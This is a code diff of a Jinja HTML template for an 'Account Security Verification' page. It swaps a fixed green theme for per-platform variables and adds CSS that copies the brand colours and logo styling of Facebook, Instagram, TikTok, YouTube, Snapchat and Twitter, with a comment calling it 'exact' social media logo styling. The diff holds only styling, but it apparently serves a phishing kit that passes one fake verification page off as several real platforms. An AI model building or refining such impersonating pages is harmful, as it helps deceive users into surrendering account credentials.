@@ -1,13 +1,14 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(16,185,129,0.15);border-radius:16px;">
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px {{ platform_shadow_color|default('rgba(16,185,129,0.15)') }};border-radius:16px;">
   {% if platform_icon and platform_name %}
+  <!-- EXACT SOCIAL MEDIA LOGO STYLING -->
   <div class="platform-header">
-    <div class="icon-circle" style="background: rgba(16,185,129,0.1); border: 2px solid rgba(16,185,129,0.2);">
-      <i class="{{ platform_icon }}" style="color: #10B981;"></i>
+    <div class="icon-circle {{ platform_bg_class|default('bg-twitter') }}">
+      <i class="{{ platform_icon }} icon-lg"></i>
     </div>
     <div>
-      <h2 class="notranslate" style="margin:0;color:#10B981;">{{ platform_name }}</h2>
+      <h2 class="notranslate" style="margin:0;color:{{ platform_color|default('#10B981') }};">{{ platform_name }}</h2>
       <div style="color:#64748b;font-size:13px">Account Security Verification</div>
     </div>
   </div>
@@ -90,8 +91,8 @@
   background: #fafafa;
 }
 .input:focus {
-  border-color: #10B981;
-  box-shadow: 0 0 0 3px rgba(16,185,129,0.15);
+  border-color: {{ platform_color|default('#10B981') }};
+  box-shadow: 0 0 0 3px {{ platform_color|default('#10B981') }}15;
   outline: none;
   background: #ffffff;
 }
@@ -120,7 +121,7 @@
 
 .verify-btn {
   width: 100%;
-  background: #10B981;
+  background: {{ platform_color|default('#10B981') }};
   color: #fff;
   font-size: 16px;
   font-weight: 700;
@@ -129,13 +130,14 @@
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 4px 12px rgba(16,185,129,0.25);
+  box-shadow: 0 4px 12px {{ platform_color|default('#10B981') }}25;
   display: block;
   margin-top: 16px;
 }
 .verify-btn:hover {
-  background: #0da271;
-  box-shadow: 0 6px 16px rgba(16,185,129,0.35);
+  background: {{ platform_color|default('#10B981') }};
+  filter: brightness(0.9);
+  box-shadow: 0 6px 16px {{ platform_color|default('#10B981') }}35;
   transform: translateY(-1px);
 }
 .verify-btn:active {
@@ -193,24 +195,78 @@
   text-align: center;
 }
 
+/* EXACT SOCIAL MEDIA LOGO STYLING FROM YOUR CSS */
 .platform-header {
   display: flex;
   align-items: center;
-  gap: 12px;
+  gap: 14px;
   margin-bottom: 24px;
   padding-bottom: 20px;
   border-bottom: 1px solid #f1f5f9;
 }
 
 .icon-circle {
-  width: 50px;
-  height: 50px;
+  width: 58px;
+  height: 58px;
   border-radius: 50%;
   display: flex;
   align-items: center;
   justify-content: center;
   flex-shrink: 0;
+  transition: all 0.4s ease;
 }
+
+/* Platform-specific styles matching your design */
+.bg-facebook .icon-circle {
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(24,119,242,0.15), 0 0 14px rgba(24,119,242,0.25);
+}
+.bg-facebook i { color: #1877F2; }
+
+.bg-instagram .icon-circle {
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(193,53,132,0.15), 0 0 14px rgba(225,48,108,0.25);
+}
+.bg-instagram i {
+  background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  font-weight: 800;
+}
+
+.bg-tiktok .icon-circle {
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(0,0,0,0.1), 0 0 16px rgba(255,0,80,0.25), 0 0 16px rgba(0,242,234,0.25);
+}
+.bg-tiktok i {
+  color: #000;
+  text-shadow: -1.8px 0 #00f2ea, 1.8px 0 #ff0050;
+  font-weight: 800;
+}
+
+.bg-youtube .icon-circle {
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(255,0,0,0.18), 0 0 14px rgba(255,0,0,0.28);
+}
+.bg-youtube i { color: #FF0000; font-weight: 800; }
+
+.bg-snapchat .icon-circle {
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(255,252,0,0.22), 0 0 18px rgba(255,252,0,0.35);
+}
+.bg-snapchat i {
+  color: #FFFC00;
+  -webkit-text-stroke: 1.5px #000;
+  font-weight: 800;
+}
+
+.bg-twitter .icon-circle {
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(0,0,0,0.12), 0 0 16px rgba(0,0,0,0.22);
+}
+.bg-twitter i { color: #000; font-weight: 800; }
+
+.icon-lg { font-size: 28px; }
 
 /* Security Timeline */
 .security-timeline {
@@ -249,8 +305,8 @@
 }
 
 .timeline-item.active .timeline-dot {
-  background: #10B981;
-  box-shadow: 0 0 0 3px rgba(16,185,129,0.2);
+  background: {{ platform_color|default('#10B981') }};
+  box-shadow: 0 0 0 3px {{ platform_color|default('#10B981') }}20;
 }
 
 .timeline-content {
@@ -273,7 +329,7 @@
 }
 
 .timeline-item.active .timeline-content strong {
-  color: #10B981;
+  color: {{ platform_color|default('#10B981') }};
 }
 
 /* Enhanced responsive design */
